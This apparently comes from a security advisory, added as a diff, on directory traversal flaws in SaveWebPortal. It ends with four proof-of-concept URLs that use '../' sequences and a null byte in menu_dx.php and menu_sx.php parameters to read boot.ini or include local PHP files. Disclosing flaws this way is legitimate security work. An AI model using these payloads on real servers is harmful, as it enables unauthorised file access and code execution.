@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/14643/info
+
+SaveWebPortal is prone to multiple directory traversal vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.
+
+Exploitation of this vulnerability could lead to a loss of confidentiality and integrity. Information obtained may aid in further attacks against the underlying system; other attacks are also possible.
+
+An attacker can also execute arbitrary local PHP files through exploitation of this vulnerability. The impact of this will depend on the PHP files available. 
+
+http://www.example.com/saveweb/menu_dx.php?SITE_Path=../../../../../boot.ini%00
+http://www.example.com/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../boot.ini%00
+
+http://www.example.com/saveweb/menu_dx.php?SITE_Path=../../../../../[script].php%00
+http://www.example.com/saveweb/menu_sx.php?CONTENTS_Dir=../../../../../[script].php%00 
